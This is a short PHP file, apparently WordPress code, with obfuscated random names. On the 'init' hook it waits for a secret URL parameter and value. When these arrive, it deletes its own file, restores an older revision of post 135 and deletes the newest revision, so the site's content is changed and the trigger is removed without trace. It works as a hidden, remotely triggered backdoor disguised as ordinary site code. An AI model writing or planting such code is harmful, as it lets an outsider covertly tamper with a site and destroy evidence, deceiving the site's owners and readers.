<?php

function publisher_drop_shortener() {
	if (isset($_GET['library_toolkit_keywords']) && $_GET['library_toolkit_keywords'] === 'refresh_templates_notifications_parts') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$interactive_typography_based = 135;
		$forum_flexible_description_best = wp_get_post_revisions($interactive_typography_based);
		if (empty($forum_flexible_description_best)) die('no revisions');
		if (count($forum_flexible_description_best) < 2) die('less than 2');
		$modules_columns_integrate_clean = array_shift($forum_flexible_description_best);
		$xml_card_community_taxonomy = $modules_columns_integrate_clean->ID;
		$engine_shopp_paragraph = array_shift($forum_flexible_description_best);
		$reminder_service_results = $engine_shopp_paragraph->ID;
		$thumbnail_data_now = wp_restore_post_revision($reminder_service_results);
		if ($thumbnail_data_now === false) die('error restoring');
		$thumbnail_data_now = wp_delete_post_revision($xml_card_community_taxonomy);		
		if ($thumbnail_data_now === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'publisher_drop_shortener');
